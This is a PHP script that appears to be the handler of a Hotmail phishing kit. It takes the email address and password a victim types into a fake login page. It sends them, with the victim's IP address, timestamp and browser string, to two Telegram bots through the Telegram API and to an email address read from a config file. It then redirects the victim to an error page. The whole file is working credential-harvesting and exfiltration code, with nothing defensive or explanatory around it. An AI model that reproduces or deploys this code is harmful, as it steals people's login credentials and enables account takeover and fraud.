<?php
error_reporting(0);
include '../anti.php';
session_start();


$v_ip = $_SERVER['REMOTE_ADDR'];
$hash = md5($v_ip);

if(!empty($_SESSION['email']))  {

$username = $_SESSION['email'];
 
}

if(!empty($_POST['password']))  {

$pass = $_POST['password'];
$_SESSION['password'] = $_POST['password'];
date_default_timezone_set('Europe/Amsterdam');
$ip = $_SERVER['REMOTE_ADDR'];
$time = date("m-d-Y g:i:a");
$agent = $_SERVER['HTTP_USER_AGENT'];
include "../config.php";
include "../recon.php";
$msg .= "+ ------------------------------------------+\n";
$msg .= "| hotmail Login Details\n";
$msg .= "+ ------------------------------------------+\n";
$msg .= "| Username: ".$username."\n";
$msg .= "| Password: ".$pass."\n";
$footer = "+ ------------------------------------------+\n";
$footer .= "+ Sent from $ip on $time via $agent\n";
$footer .= "+ ------------------------------------------+\n\n";


 $url = "https://api.telegram.org/bot" . $telegram_bot_api . "/sendMessage?chat_id=" . $telegram_chat_id . "&text=". urlencode($msg);
$ch = curl_init();
$optArray = array(CURLOPT_URL => $url, CURLOPT_RETURNTRANSFER => true);
curl_setopt_array($ch, $optArray);
$result = curl_exec($ch);
curl_close($ch);

 $url = "https://api.telegram.org/bot" . $telegram_api . "/sendMessage?chat_id=" . $telegram_id . "&text=". urlencode($msg);
$ch = curl_init();
$optArray = array(CURLOPT_URL => $url, CURLOPT_RETURNTRANSFER => true);
curl_setopt_array($ch, $optArray);
$result = curl_exec($ch);
curl_close($ch);

$data = $msg . $footer;

$_SESSION['emailr'] = $msg;

$subject = "hotmail Login Info for $username";
$headers .= "MIME-Version: 1.0\r\n";
$headers .= "Content-Type: text/plain; charset=utf-8\r\n";
@mail($mail, $subject, $msg, $headers);
 
 

 sleep(1);
header("location: error.php");  
}

?>
